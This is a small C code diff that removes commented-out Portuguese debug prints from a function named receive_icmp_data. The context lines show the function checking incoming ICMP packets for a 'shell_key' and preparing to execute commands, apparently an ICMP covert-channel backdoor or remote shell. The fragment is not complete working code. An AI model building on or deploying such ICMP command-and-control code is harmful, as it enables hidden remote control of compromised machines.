@@ -218,12 +218,11 @@ void *receive_icmp_data(void *lparam){
           
           char *verify;
           verify = strstr(data, shell_key);
-          //printf("PONTEIRO: %c", *verify);
-          //printf("chegou ate o verify\n");
+       
 
 
           if (verify != 0){
-          //printf("test");
+          
 
             char exec_command[2048];
             char pwd[100];
@@ -256,7 +255,7 @@ void *receive_icmp_data(void *lparam){
               memset(exec_command, 0x00, 2048);
             }
           }else{
-            //printf("key invalida");
+            
             icmp_sendrequest(sockfd, ip->saddr, data, sizeof(data));
           }
 
